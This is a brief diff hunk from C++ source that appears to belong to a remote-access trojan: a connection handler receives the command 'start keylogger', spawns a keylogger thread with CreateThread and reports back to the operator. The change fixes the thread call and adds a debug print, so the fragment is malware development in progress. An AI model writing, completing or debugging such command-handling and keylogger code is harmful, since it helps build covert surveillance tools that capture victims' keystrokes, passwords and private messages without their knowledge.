@@ -331,9 +331,9 @@ void Connection::connection() {
             continue;
         } else if (!command.rfind("start keylogger")) {
             Keylogger keylogger = Keylogger();
-            ::CreateThread(nullptr, 0,
-                           reinterpret_cast<LPTHREAD_START_ROUTINE>(keylogger.startKeylogger()),
-                           nullptr, 0, nullptr);
+            CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Keylogger::startKeylogger),
+                         nullptr, 0, nullptr);
+            cout << "Test:start keylogger" << endl;
             sendMessage("The keylogger has started");
             continue;
         }
